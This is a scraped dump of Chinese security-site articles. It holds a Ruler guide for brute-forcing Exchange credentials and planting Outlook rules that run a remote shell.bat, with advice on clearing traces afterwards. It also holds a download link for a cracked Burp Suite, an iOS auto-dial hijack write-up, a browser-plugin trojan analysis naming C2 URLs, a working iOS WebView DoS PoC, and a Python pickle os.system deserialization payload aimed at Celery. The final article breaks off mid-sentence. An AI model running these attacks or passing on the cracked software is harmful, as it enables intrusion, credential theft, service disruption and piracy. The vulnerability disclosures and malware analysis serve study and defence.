onYouTube它能做什么？Ruler包含多种已经实现的和正在研发或计划研发的功能，包括：枚举有效用户查看当前配置邮件规则创建新的恶意邮件规则删除邮件规则当与Exchange交互并使用自动发现服务（与Outlook客户端一样）发现相关信息时，Ruler会处于半智能状态。获取代码Ruler是用Go语言编写的，因此你需要有GO语言环境来运行并创建相关项目。第一步是克隆它的仓库。git clone https://github.com/sensepost/ruler.git或者你可以直接通过Go命令获取。go get github.com/sensepost/ruler如果你想运行这个APP的话请使用 go rungo run ruler.go –h或直接创建一个（首选）：go build与Exchange交互它目前与用于OutlookAnywhere的新版 MAPI/HTTP 协议兼容，且可能与被 MAPI 取代的旧版 RPC/HTTP 协议存在不兼容的情况。凭证的暴力破解如果你走暴力破解的路线，那么Ruler绝对是你的菜。它有一个内置的暴力破解工具，能够做寻找凭证这项半智能的工作。./ruler -domain targetdomain.com -brute -usernames/path/to/user.txt -passwords /path/to/passwords.txt你应该看得到你正在运行的暴力破解过程：./ruler -domain evilcorp.ninja -brute -usernames~/users.txt -passwords ~/passwords.txt -delay 0 -v -insecure[*] Starting bruteforce[x] Failed: cindy.baker:P@ssw0rd[x] Failed: henry.hammond:P@ssw0rd[x] Failed: john.ford:P@ssw0rd[x] Failed: cindy.baker:August2016[x] Failed: henry.hammond:August2016[+] Success: john.ford:August2016[*] Multiple attempts. To prevent lockout - delaying for0 minutes.[x] Failed: cindy.baker:Evilcorp@2016[x] Failed: henry.hammond:Evilcorp@2016[x] Failed: cindy.baker:3V1lc0rp[x] Failed: henry.hammond:3V1lc0rp[*] Multiple attempts. To prevent lockout - delaying for0 minutes.[x] Failed: henry.hammond:Password1[+] Success: cindy.baker:Password1[x] Failed: henry.hammond:Password!2016[*] Multiple attempts. To prevent lockout - delaying for0 minutes.[x] Failed: henry.hammond:SensePost1[x] Failed: henry.hammond:Lekker[*] Multiple attempts. To prevent lockout - delaying for0 minutes.[x] Failed: henry.hammond:Eish或者，你可以使用-userpass选项指定用户传递文件。 用户传递文件应以冒号分隔，每行一对凭证：$ cat userpass.txtjohn.ford:August2016henry.hammond:Password!2016cindy.baker:Password1./ruler -domain evilcorp.ninja -brute -userpassuserpass.txt -v -insecure[*] Starting bruteforce[+] Success: john.ford:August2016[x] Failed: henry.hammond:Password!2016[+] Success: cindy.baker:Password1还有其它的一些参数与-brute协同工作，包括：-stop //在第一个有效的用户名上停止:密码combo-delay //多次密码猜测之间的停留时间间隔-attempts //在停留之前需要进行几次尝试（每个用户的尝试次数）-insecure //当Exchange服务器有一个坏的SSL证书时-v //详细地显示失败的尝试自动发现服务（The autodiscover service）尽管Ruler在“自动发现”必要设置上作出了很大的努力，但你仍然可能会遇到失败的情况。一般原因有以下几点：自动发现http/非https上的部署（我们默认https是更为普遍的情况）无自动发现DNS记录身份验证失败若你碰到使自动发现服务崩溃的Exchange服务器，你可以手动设置自动发现的目标URL：./ruler -urlhttp://autodiscover.somedomain.com/autodiscover/autodiscover.xml若碰到身份验证问题（并且确定登录凭证正确无误），你可以尝试强制使用-basic进行基本身份验证。-v flag同样能给你一些自动发现服务所使用进程的提示。显示现有规则/账户验证只要有一组凭证，你就可以以该用户的邮箱为目标，但我们需要知道该用户的邮箱地址（邮箱地址簿搜索功能已列入研发计划）./ruler -domain targetdomain.com -emailuser@targetdomain.com -user username -pass password –display输出：./ruler -domain evilcorp.ninja -user john.ford -passAugust2016 -email john.ford@evilcorp.ninja -display -insecure[*] Retrieving MAPI info[*] Doing Autodiscover for domain[+] MAPI URL found: https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja[+] User DN: /o=Evilcorp/ou=Exchange Administrative Group(FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford[*] Got Context, Doing ROPLogin[*] And we are authenticated[+] Mailbox GUID: [251 102 208 159 53 202 228 77 184 67 76 15 228 47 61 223][*] Openning the Inbox[+] Retrieving Rules[+] Found 0 rules删除现有规则（清理痕迹）例如：通过模糊匹配000000df1（规则名称附近的ruleId）来删除相应规则./ruler -domain targetdomain.com -emailuser@targetdomain.com -user username -pass password -delete 000000df1反弹shell 现在到最有意思的部分了。你的初始设置和Silentbreak博客所述的是一样的，设置您的控制端服务器来承载您的payload。创建新的规则用户Ruler以及：./ruler -domain targetdomain.com -emailuser@targetdomain.com -user username -pass password -loc""\\\\yourserver\\webdav\\shell.bat"" -trigger ""pop a shell""-rule maliciousrule各个部分：-loc 表示远程shell的位置，连接远程shell时请注意使用双斜杠\（或者c:/Windows/system32/calc.exe）-trigger 表示主题中你想用来触发规则的命令-rule 表示你所创建规则的名称输出：[*] Retrieving MAPI info[*] Doing Autodiscover for domain[+] MAPI URL found: https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja[+] User DN: /o=Evilcorp/ou=Exchange Administrative Group(FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford[*] Got Context, Doing ROPLogin[*] And we are authenticated[+] Mailbox GUID: [251 102 208 159 53 202 228 77 184 67 76 15 228 47 61 223][*] Openning the Inbox[*] Adding Rule[*] Rule Added. Fetching list of rules...[+] Found 1 rulesRule: shell RuleID: 01000000127380b1现在你可以发一封邮件给你的目标，并且将执行代码写在邮件的主题行中。从测试邮件规则开始都是同步发送的，因此在通常的情况下假设目标的outlook处于打开并联网的状态，你应该能够立即获取对方的shell。半自动化攻击（Semi-Autopwn）如果你想实现自动化地触发规则，Ruler能利用用户自己的邮箱在他们的收件箱中创建一个新邮件。也就是说你不再需要向你的攻击目标发送邮件，只要在创建规则时使用-send这个参数即可。你所创建的规则同步需要等待30秒（如果你觉得30秒太长或太短都可以在源码中作出调整），然后通过MAPI发送邮件。[*] Retrieving MAPI/HTTP info[*] Doing Autodiscover for domain[*] Autodiscover step 0 - URL:https://outlook.com/autodiscover/autodiscover.xml[+] MAPI URL found: https://outlook.office365.com/mapi/emsmdb/?MailboxId=0003bffd-fef9-fb24-0000-000000000000@outlook.com[+] User DN: /o=First Organization/ou=Exchange AdministrativeGroup(FYDIBOHF23SPDLT)/cn=Recipients/cn=0003BFFDFEF9FB24[*] Got Context, Doing ROPLogin[*] And we are authenticated[+] Mailbox GUID: dc561d32a809304b8dbc91cc9f0ae1e2[*] Openning the Inbox[*] Adding Rule[*] Rule Added. Fetching list of rules...[+] Found 1 rulesRule: autopop RuleID: 010000000c4baa84[*] Auto Send enabled, wait 30 seconds before sendingemail (synchronisation)[*] Sending email[*] Message sent, your shell should trigger shortly.[*] And disconnecting from server好好玩儿吧。但不要忘了通过删除规则（或永久保留）等方法清理干净。工具下载地址：https://github.com/sensepost/ruler","2016-10-27 00:39:59","安全工具","Ruler：一款利用Exchange服务渗透的安全工具","http://nsoad.com/Security-tools/20161027/tools-639.html"
"5ccbfb0c4f2f0a0a7a69c103","众所周知，Burp Suite是响当当的web应用程序渗透测试集成平台。从应用程序攻击表面的最初映射和分析，到寻找和利用安全漏洞等过程，所有工具为支持整体测试程序而无缝地在一","Kender","众所周知，Burp Suite是响当当的web应用程序渗透测试集成平台。从应用程序攻击表面的最初映射和分析，到寻找和利用安全漏洞等过程，所有工具为支持整体测试程序而无缝地在一起工作。平台中所有工具共享同一robust框架，以便统一处理HTTP请求、持久性、认证、上游代理、日志记录、报警和可扩展性。Burp Suite允许攻击者结合手工和自动技术去枚举、分析、攻击Web应用程序。前期整理《渗透测试神器Burp Suite v1.6.27》《Burpsuit插件开发之RSA加解密》《BurpSuite中的安全测试插件推荐》拦截代理（Proxy），你可以检查和更改浏览器与目标应用程序间的流量；可感知应用程序的网络爬虫（Spider），它能完整的枚举应用程序的内容和功能；高级扫描器，执行后它能自动地发现web应用程序的安全漏洞；入侵测试工具（Intruder），用于执行强大的定制攻击去发现及利用不同寻常的漏洞；重放工具（Repeater），一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具；会话工具（Sequencer），用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具；解码器，进行手动执行或对应用程序数据者智能解码编码的工具；扩展性强，可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。v1.7.08版破解版：链接: http://pan.baidu.com/s/1c2DUnp2 密码: 22kf（警告：请自行检测程序安全性，仅供尝鲜，24小时内自觉删除）","2016-11-03 05:00:50","安全工具","渗透测试神器Burp Suite v1.7.08","http://nsoad.com/Security-tools/20161103/tools-681.html"
"5ccbfb0c4f2f0a0a7a69c104","漏洞概述安全研究专家发现，iOS的WebViews组件中存在漏洞，攻击者或可利用这个漏洞来控制目标手机进行自动拨号（号码可控制）。在这种攻击场景中，攻击者可以在短时间内屏蔽","Kong","漏洞概述安全研究专家发现，iOS的WebViews组件中存在漏洞，攻击者或可利用这个漏洞来控制目标手机进行自动拨号（号码可控制）。在这种攻击场景中，攻击者可以在短时间内屏蔽用户手机的图形操作界面（UI），并通过这种方法防止用户挂断通话。这是一个应用程序漏洞，该漏洞主要是由操作系统框架层的设计缺陷所导致的。需要注意的是，这个漏洞的利用方法非常简单，攻击者可以轻易地利用这个漏洞实施攻击，所以各位App开发人员应该尽快修复应用代码中存在的问题。安全研究人员目前已经确认，Twitter和LinkedIn的iOS端App存在这个漏洞，但是还有很多其他的App同样也会存在这个问题。针对911报警电话的拒绝服务攻击大约在一个星期之前，我看到了一篇文章，这篇文章大致描述的是：有一个人创建了一个恶意Web页面，当用户访问这个页面时，用户的iPhone手机将会自动拨打911报警号码，从而实现了对911报警电话的拒绝服务攻击。看到这篇报道之后，我立刻想到了我在2008年10月份提交给苹果公司的一个漏洞[传送门]，攻击者所使用的这个漏洞肯定跟手机调用拨号功能的TEL URI有关。但是我并不认为攻击者利用的是我之前所报告过的那个漏洞，所以我打算深入调查一下。漏洞的严重性攻击者可以在App中嵌入一条恶意链接，当用户点击这条链接之后手机便会自动拨打某个电话号码。如果你觉得这并不是什么大问题的话，请你再考虑一下。针对911报警电话的拒绝服务攻击已经非常恐怖了，而攻击者甚至还可以通过让你的手机自动拨打付费电话来谋取巨额利益。除此之外，犯罪分子还可以控制目标手机拨打他的电话，这样一来犯罪分子便获取到了目标用户的手机号码。所有的这一切都是你不希望看到的。于是我打算对iOS版的Twitter App进行分析。我在很短的时间内就制作出了一个可以正常工作的自动拨号程序，其简单程度令我感到震惊。我一开始还以为这是我之前提交给苹果公司的那个漏洞，但我在仔细研究过后发现，因为攻击者在攻击过程中使用了大量的JavaScript脚本和各种弹出窗口，所以这应该是另一个漏洞，至少这个漏洞的触发机理与之前的不同。在此之前，我只需要一行HTML代码（一个指向TEL URL的meta-refresh标签）就可以触发那个漏洞了，所以我打算通过Twitter的漏洞奖励计划将该漏洞上报给Twitter公司。我此前从未参与过任何的漏洞奖励计划，所以我觉得这也是一种不错的经历。当然了，Twitter在几天之后便确认了这个漏洞，然后也给我支付了漏洞奖金。在11月7日，我更新了提交给Twitter的漏洞报告，我在其中添加了关于UI屏蔽的问题，并且还上传了演示视频。但是Twitter却在没有提供任何其他评论的情况下直接关闭了我所提交的漏洞，因为他们认为这个问题与我之前提交的漏洞重复了。但我认为，Twitter应该表现得更加“绅士”一些，至少应该对我们这些利用业余休息时间帮他们挖漏洞的人要心存感激。所以我决定，出于他们对我的“无礼”，我打算将该漏洞的细节信息公布出来。漏洞分析我在进行了深入分析之后发现，使用WebViews来显示内容的iOS应用普遍都存在这个问题。为了验证我的想法，我对我手机中已经安装了的几款热门应用进行了测试。包含漏洞的应用首先要给用户提供一条Web链接，只有当目标Web页面在应用程序的WebView中打开时，用户才会受到攻击。如果恶意链接在类似Safari或Chrome之类的移动端浏览器中打开的话，用户是不会受该漏洞影响的。考虑到LinkedIn是商业类的社交媒体软件，所以我一开始测试的是LinkedIn的iOS端App。用户可以用这款App发送信息或者更新状态，而更新中通常会包含文字和链接。我发布了一条链接，然后点击了这条链接。果然不出我所料，点击之后我的手机便开始拨打我的另外一个号码了。（演示视频在下方）于是我打算将该漏洞上报给LinkedIn，而且他们的确也有相应的漏洞奖励计划。但不幸的是，LinkedIn的漏洞奖励计划是不对外开放的，只有之前提交过漏洞的人才能参加这个计划。我努力了一阵之后，结果是徒劳无功。在我思考片刻之后，我决定不提交给LinkedIn了，我要公开这个漏洞。毕竟现在已经是2016年了，他们既然不打算将我列为漏洞奖励对象的话，我尊重他们的选择。不过通常情况下，我是不会直接将漏洞曝光的…漏洞触发机理我记得我在2008年提交那个漏洞的时候，附带了相应的PoC。而我发现，这个PoC现在竟然在Twitter和LinkedIn的App上仍然奏效。先回顾一下，当时我们可以通过访问一个网站（重定向至手机的TEL URL）来触发这个漏洞，并控制目标手机来拨打电话。实现TEL URL重定向的方法有很多，例如http-meta refresh、iframe、 设置document.location、window.location、或者HTTP重定向。这些方法都可以直接实现拨打电话。当然了，用户可以在屏幕中看到手机所拨打的电话号码，他们也可以直接按下“挂断”键来终止这通电话。但是能够实现自动拨打电话就已经非常糟糕了，不明真相的群众看到这种情况肯定也会一脸懵。需要注意的是，在我利用2008年所提交的那个漏洞时，我可以屏蔽用户手机的UI界面，虽然只能屏蔽几秒钟，但这也足够防止用户挂断通话了。所以我打算将这个小技巧用到这个漏洞上来，而这个技巧确实可以让iOS操作系统在拨号的过程中打开另外一个应用程序。实现方法也很简单，你只需要通过打开一个URL地址就可以让iOS运行另外一个应用程序了。实际上，你只需要绑定一个URI，你就可以运行任何一个iOS应用程序了。当时，我使用了一个SMS URL（带有一个非常长的电话号码）来屏蔽UI线程。在我看来，漏洞存在的主要原因是IPC子系统无法正常地将这些上千字节的URL数据转移至应用程序中，而应用程序也不希望接收到这样的URL。我的PoC代码如下图所示，我在攻击代码中使用了meta-refresh标签和window.location。我设置的延迟时间为1.3秒，这样就可以保证我的拨号器可以首先得到运行。这个延迟时间不能太长，否则WebView就不会通过URL来启动短信App了。所以时间必须设置得恰到好处。漏洞触发演示我在下方给大家提供了两个攻击演示视频。你可以清楚地看到手机的UI界面在短时间内是无法响应用户操作的。在这段时间内，电话已经拨通了，尤其是某些付费电话。演示视频一：演示视频二：正常App的拨号操作通常情况下，一款合法的App在执行某个URL之前，首先会对其进行检测，然后再弹出对话框。当用户同意之后，相应的App才会被启动。如下图所示：移动端的Safari浏览器在拨打苹果服务电话之前，也会提醒用户。这才是一款合法App应有的表现！Dropbox也会在拨打电话之前给用户提示，但是并没有显示电话号码。不过，这也总好过什么也不提示吧！总结苹果的开发者们应该立刻审查自己的App是否会受到这个漏洞的影响，如果有的话，请立刻修复相应的问题。参考资料1. http://news.softpedia.com/news/bug-bounty-hunter-launches-accidental-ddos-on-911-systems-via-ios-bug-509738.shtml2. http://arstechnica.com/security/2016/10/teen-arrested-for-iphone-hack-that-threatened-emergency-911-system/3. https://archive.cert.uni-stuttgart.de/bugtraq/2009/06/msg00190.html4. https://tools.ietf.org/html/rfc28065. https://tools.ietf.org/html/rfc3966","2016-11-10 13:00:45","系统安全","iOS WebView自动拨号漏洞（含演示视频）","http://nsoad.com/Article/system/20161110/735.html"
"5ccbfb0c4f2f0a0a7a69c105","近期，腾讯反病毒实验室发现一款通过浏览器插件作恶的木马程序大量传播，经分析，该木马能够静默安装IE、Chrome两种类型的多款浏览器插件，通过这些恶意插件实现篡改导航网","silence","近期，腾讯反病毒实验室发现一款通过浏览器插件作恶的木马程序大量传播，经分析，该木马能够静默安装IE、Chrome两种类型的多款浏览器插件，通过这些恶意插件实现篡改导航网站、搜索引擎的推广ID获利，同时篡改购物网站的商品链接，以返利网站跳转实现推广获利，影响数十万用户。根据其源码注释，我们得知该木马代号——“杀手”。 “杀手”木马的部分注释，本文所有代码相关注释均为木马作者所写概况“杀手”木马的功能主要通过浏览器插件实现，安装过程较为复杂，绕过了系统和浏览器的很多安全机制，能够在系统和浏览器默认安全等级下实现静默安装恶意插件。该木马支持X86、X64两种操作系统，支持IE、Chrome以及多种国产改装版浏览器，影响广泛，危害严重。木马安装流程“杀手”木马以插件形式工作，但是主要功能是由服务器下发的javascript脚本实现，主要通过两种方式获利：一是篡改导航网站的推广ID获利，二是监控浏览器，当用户访问购物网站时，将商品链接篡改为返利链接从而获取返利。   木马功能示意图详细分析1、自解压“杀手”木马通过多种渠道推广，其安装包是一个7z自解压程序，其解压脚本如下，将文件静默释放到指定目录后执行指定文件。 自解压脚本以下是“杀手”木马自解压包中的文件结构，其中1.0.0目录中存放的是各种基于Chrome内核的浏览器插件，目录compose中存放是IE浏览器BHO插件及安装程序，三个exe程序功能依次是安装程序、32位系统过UAC程序、64位系统过UAC程序。  安装包内容2、过UAC安装程序运行后会检测系统版本以及UAC级别，尝试绕过UAC将自身提升为管理员权限，以便后续插件的安装，“杀手”木马过UAC的步骤如下： “杀手”木马过UAC流程过UAC相关代码3、插件安装3.1 Chrome类浏览器插件安装“杀手”木马并没有使用传统的.crx文件来安装浏览器插件，而是直接通过修改Secure Preference配置文件来实现绕过浏览器安装提示，包括xxx安全浏览器、2xxx浏览器、Coolnovo浏览器都是使用此方法静默安装插件。  Chrome浏览器插件静默安装相关代码该插件伪装成二维码小秘，其实并无二维码相关功能。各种浏览器安装完插件后效果如下，用户可自行检查自己是否中招。   在Chrome浏览器中插件展示形式在某安全浏览器中插件展示形式在某浏览器中插件展示形式3.2 IE浏览器插件安装IE浏览器的插件安装方式就是将恶意dll注册成BHO，与传统恶意插件无区别。    在IE浏览器插件安装相关代码在IE浏览器中插件展示形式4、插件功能：Chrome类插件的功能都是通过javascript脚本实现的，主要功能代码通过background.js下载执行，background.js是Chrome插件的后台页面，打开浏览器就会率先执行该脚本。4.1导航推广ID劫持从hxxps://new.hai33.com/hao.gif获取代码，到本地解压执行下载执行脚本相关代码下载的代码经过编码混淆，去混淆后发现该脚本主要用于监控浏览器对导航网站的访问，发现用户访问网址导航页面，且带有推广ID的话，直接篡改推广ID。国内多个知名网址导航网站名列其中。  混淆的代码  去混淆后的篡改导航推广id相关代码去混淆后的篡改导航推广ID相关代码4.2购物网站返利跳转监控浏览器，打开任何网站时产检均会访问hxxp://new.hai33.com/s，并提交相关参数，服务器会检测http请求参数中的Refer参数，即当前打开的页面，如果发现是购物类相关网站，则服务器会反馈恶意劫持脚本。劫持脚本的功能是替换目标页面中制定的商品链接，将其替换为跳转链接，跳转到返利网站，返利网站会将返利相关的参数写入到cookies中，随后跳转到商品页面，此后用户在cookies有效期内下单，木马作者都能够得到返利。为了实现隐蔽性，在替换链接前会先检测指定cookies是否有效，如果有效，则不会进行链接替换。因此十分隐蔽，恶意行为难以被发现。下载执行脚本相关代码C&amp;C通过Referer确定是否返回恶意js针对某电商网站的恶意js最终通过linktech.cn购物推广联盟网站进行返利跳转 部分会被劫持的电商网站列表IE浏览器插件：IE浏览器插件实现的功能类似，也是通过下载javascript代码插入到浏览器中执行来实现的，在此不再重复描述。下载恶意js相关代码 向页面中插入恶意js相关代码后记由于安全软件对浏览器做了较多的安全保护，传统通过外部程序控制浏览器的行为越来越难以绕过安全软件的查杀和拦截，因此木马演化成了浏览器插件直接在内部实现对浏览器的各种操作。通过脚本实现的Chrome类浏览器插件也增加了安全软件检测查杀的难度。杀手木马虽然看似对用户危害不大，然而黑客可以通过改变C&amp;C上的恶意脚本来实现各种恶意行为，如获取浏览器输入的各种帐号密码，上传浏览记录等，危害十分严重。这一点我们看下该插件的权限就知道了，以后这类恶意程序可能会越来越多，目前电脑管家已率先查杀该木马。   插件权限，能够获取浏览器相关的一切信息","2016-10-20 19:01:04","Web安全","“杀手”木马：一个浏览器恶意插件行为分析","http://nsoad.com/Article/web/20161020/614.html"
"5ccbfb0c4f2f0a0a7a69c106","概述近期分析一个iOS APP Crash时发现在应用内打开好友发送的URL链接时应用假死后直接挂掉。经排查确认是iOS WebViews存在远程拒绝服务漏洞，攻击者可以利用这个漏洞使打开","kong","概述近期分析一个iOS APP Crash时发现在应用内打开好友发送的URL链接时应用假死后直接挂掉。经排查确认是iOS WebViews存在远程拒绝服务漏洞，攻击者可以利用这个漏洞使打开恶意网页的应用、iOS Safari浏览器拒绝服务。这个漏洞的利用方法非常简单，攻击者可以轻易的使用该漏洞进行攻击。涉及设备：iPhone、iPad、iTouch涉及系统：iOS 8.4~10.1.1APP：支付宝 V9.9.6漏洞危害攻击者在调用WebViews的APP（微信、QQ、微博….）中发送恶意链接或使用其他方式诱导受害者点击链接来启动恶意页面。一旦这个页面打开你会发现页面内容加载出来后，无论你怎么点击页面，APP或Safari浏览器都没有反应，数秒后直接崩溃掉。下面是Remote DOS APP POC，Safari浏览器的POC暂不放出。Remote DOS APP POC:&lt;html&gt;&lt;head&gt;&lt;title&gt;DOS POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Start Attack - By MrYu.&lt;/h1&gt;&lt;script&gt;y = ""asddfg"";for (i = 0; i &lt; 10000000; i++) {y = y + ""189768765409685743"";}function attack() {window.location.href = y;}setTimeout(""attack()"", 1100);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;在恶意html页面内嵌入JavaScript代码，看代码可知程序生成了非常长的数字并把这些数字拼接到了url中，iOS WebView在处理庞大字节URL链接出现异常导致APP崩溃。演示视频总结受影响的不仅仅是支付宝，很多厂商SRC遇到这样的DOS漏洞通常会以“系统问题”为由而拒收。本文仅仅是把问题抛出来，漏洞影响和是否值得修复，大家可以酌情处理。","2016-11-16 14:15:07","系统安全","iOS WebView远程拒绝服务漏洞(含支付宝演示视频)","http://nsoad.com/Article/system/20161116/788.html"
"5ccbfb0c4f2f0a0a7a69c107",,"silence","分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 __reduce__() 会在 pickle 库进行反序列化的时候进行调用，PHP 中类的魔术方法 __wakup() 同样也会在实例进行反序列化的时候调用等等。从开发者角度看来，开发语言提供的数据序列化方式方便了实例对象进行跨应用传递，程序A 和 程序B 能够通过序列化数据传递方式来远程访问实例对象或者远程调用方法（如 Java 中的 RMI）；而站在安全研究者角度，这种跨应用的数据传递或者调用方式可能存在对象数据篡改和方法恶意调用的安全隐患。在消息队列的实现中，消息数据的序列化（封装）方式就成了一颗定时炸弹，不安全的序列化方式可能会导致消息数据被篡改，从而引发反序列化（数据解析）后的一些列安全问题。消息队列中间件的选择也是一大问题，常见的有 RabbitMQ，ActiveMQ，Kafka，Redis 等，而像 Redis 这种存在未授权访问问题的组件如果被攻击者所控制，即可通过组件直接向消息队列中插入数据，轻则影响整个分布式节点的逻辑处理，重则直接插入恶意数据结合反序列化等问题对节点群进行攻击。说了这么多，总结一下上面提到的几个安全问题：各语言中存在的序列化问题可直接导致远程命令执行；消息队列的实现常常会直接使用语言自身的序列化（或相似的）方式封装消息；分布式系统使用的消息队列中间件种类繁多，其中某些分布式框架使用了像 Redis 这种存在着未授权访问问题的组件；消息队列中消息的篡改会直接或间接影响到分布式节点；将这 4 个安全问题或者说是漏洞结合在一起，即可成为一种可直接入侵和破坏分布式节点的攻击方法。那么，是否存在真正满足上述问题的实例呢？目前，已经发现了 Python 中 Celery 分布式框架确实存在这样的问题，下面我会针对上诉 4 个问题以 Celery 分布式框架为例来说明如何攻击分布式节点打出漏洞组合拳。一、老生常谈 Python 序列化Celery 分布式框架是由 Python 语言所编写的，为了下面更好的说明问题，所以这里首先简单的回顾一下 Python 序列化的安全问题。1. 简单的序列化例子Python 中有这么一个名为 pickle 的模块用于实例对象的序列化和反序列化，一个简单的例子：import base64import pickleclass MyObj(object):    loa = 'hello my object'    t_obj = MyObj()serialized = base64.b64encode(pickle.dumps(t_obj))print('--&gt; pickling MyObj instance {} and Base64 it\ngot ""{}""'.format(t_obj, serialized))print('--&gt; unpickling serialized data\nwith ""{}""'.format(serialized))obj = pickle.loads(base64.b64decode(serialized))print('** unpickled object is {}'.format(obj))print('{} -&gt; loa = {}'.format(obj, obj.loa))因 pickle 模块对实例对象进行序列化时产生的是二进制结构数据，传输的时候常常会将其进行 Base64 编码，这样可以有效地防止字节数据丢失。上面的程序作用是将一个 MyObj 类实例进行序列化并进行 Base64 编码然后进行解码反序列化重新得到实例的一个过程，运行程序后得到输出：通过截图可以看到序列化前和序列化后的实例是不同的（对象地址不同），并且通常反序列化时实例化一个类实例，当前的运行环境首先必须定义了该类型才能正常序列化，否则可能会遇到找不到正确类型无法进行反序列化的情况，例如将上诉过程分文两个文件 serializer.py 和 unserializer.py，前一个文件用于实例化 MyObj 类并将其序列化然后经 Base64 编码输出，而后一个文件用于接收一串字符串，将其 Base64 解码后进行反序列化：# serializer.pyimport base64import pickleclass MyObj(object):    loa = 'hello my object'print(base64.b64encode(pickle.dumps(MyObj())))# unserializer.pyimport sysimport base64import pickleprint(pickle.loads(base64.b64decode(sys.argv[1])))就上面所说，在反序列化时如果环境中不存在反序列化类型的定义，因为 unserializer.py 中未定义 MyObj 类，则在对 serializer.py 输出结果进行反序列化时会失败报错，提示找不到 MyObj：2. Trick 使得反序列化变得危险看似反序列化并不能实例化任意对象（运行环境依赖），但有那么些 tricks 可以达到进行反序列化即可任意代码执行的效果。如果一个类定义了 __reduce__() 函数，那么在对其实例进行反序列化的时候，pickle 会通过 __reduce__() 函数去寻找正确的重新类实例化过程。（__reduce__() 函数详细文档参考）例如这里我在 MyObj 类中定义 __reduce__() 函数：...class MyObj(object):    loa = 'hello my object'    def __reduce__(self):        return (str, ('replaced by __reduce__() method', ))...然后再执行上一节的程序过程，会直接得到输出：这里不再报错是因为，MyObj 在进行序列化的时候，将重新构建类的过程写进了序列化数据里，pickle 在进行反序列化的时候会遵循重建过程去执行相应操作，这里是使用内置的 str 函数去操作参数 'replaced by __reduce__() method' 并返回，所以成功反序列化并输出的字符串。有了 __reduce__() 这个函数，就可以利用该特性在反序列化的时候直接执行任意代码了，如下示例代码：# evil.pyimport osimport base64import pickleclass CMD(object):    def __reduce__(self):        return (os.system, ('whoami', ))print(base64.b64encode(pickle.dumps(CMD())))运行得到编码后的序列化数据：Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==这里需要主要的是 os.system('whoami') 这个过程不是在序列化过程执行的，而是将这个过程以结构化的数据存于了序列化数据中，这里可以看一下二进制序列化数据：➜  demo echo -n ""Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg=="" | base64 -D | xxd0000000: 6370 6f73 6978 0a73 7973 7465 6d0a 7030  cposix.system.p00000010: 0a28 5327 7768 6f61 6d69 270a 7031 0a74  .(S'whoami'.p1.t0000020: 7032 0a52 7033 0a2e                      p2.Rp3..➜  demo数据都是以 Python pickle 序列化数据结构进行整合的，具体底层协议实现可参考官方文档。对上面的序列化数据使用 unserializer.py 进行反序列化操作时，会触发类重构操作，从何执行 os.system('whoami')：历史上框架或者应用由于 Python 反序列化问题导致的任意命令执行并不少见，如 Django 低版本使用了 pickle 作为 Session 数据默认的序列化方式，在设置了使用 Cookie 进行 Session 数据存储的时候，会使得攻击者直接构造恶意 Cookie 值，触发恶意的反序列化进行任意命令执行；又一些程序可接受一串序列化数据作为输入，如 SQLMAP 之前的 --pickled-options 运行参数就可以传入由 pickle 模块序列化后的数据。虽然官方有对 pickle 模块进行安全声明，指明了不要反序列化未受信任的数据来源，但是现实应用逻辑繁杂，常会有这样的数据可控的点出现，也是不太好避免的。二、分布式框架 Celery回顾完 Python 序列化的问题，这时候转过来看一下 Celery 这个分布式框架。1. 使用框架进行简单的任务下发Celery 借助消息队列中间件进行消息（任务）的传递，一个简单利用 Celery 框架进行任务下发并执行的例子：# celery_simple.pyfrom celery import Celeryapp = Celery('demo', broker='amqp://192.168.99.100//', backend='amqp://192.168.99.100//')@app.taskdef add(x, y):    return x + yCelery 推荐使用 RabbitMQ 作为 Broker，这里直接在 192.168.99.100 主机上开启 RabbitMQ 服务，然后在终端使用 celery 命令起一个 worker：celery worker -A celery_simple.app -l DEBUG然后另起一个 ipython 导入 celery_simple 模块中的 add() 函数，对其进行调用并获取结果：In [1]: from celery_simple import addIn [2]: task = add.apply_async((4, 5))In [3]: task.resultOut[3]: 92. 框架中的消息封装方式本文并不关心框架的具体实现和用法，只关心消息的具体封装方式。在 Celery 框架中有多种可选的消息序列化方式：picklejsonmsgpackyaml…可以看到 Celery 框架所使用的消息序列化方式中含有 pickle 的序列化方式，上一部分已经说明了 Python 中 pickle 序列化方式存在的安全隐患，而 Celery 框架却支持这种方式对消息进行封装，并且在 4.0.0 版本以前默认使用的也是 pickle 序列化方式。为了弄明白 Celery 的消息格式，这里将 Broker 换成 Redis 方便直接查看数据。# celery_simple.pyfrom celery import Celeryapp = Celery('demo', broker='redis://:@192.168.99.100:6379/0', backend='redis://:@192.168.99.100:6379/0')@app.taskdef add(x, y):    return x + y这里先不起 worker 进程，直接使用 ipython 进行任务下发：In [1]: from celery_simple import addIn [2]: task = add.apply_async((4, 9))这时候查看 Redis 里面的数据：可以看到 Redis 里面存在两个键，celery 和 _kombu.binding.celery，这里解释一下具体两个键的具体含义。在 Celery 中消息可以根据路由设置分发到不同的任务上，例如这里 add() 函数由于没有进行特别的设置，所以其所处的消息队列为名为 celery 的队列，exchange 和 routing_key 值都为 celery，所有满足路由（{""queue"":""celery"",""exchange"":""celery"",""routing_key"":""celery""}）的消息都会发到该 worker 上，然后 worker 根据具体的调用请求去寻找注册的函数使用参数进行调用。而刚刚提到的 Reids 中的键 _kombu.binding.celery 表示存在一个名为 celery 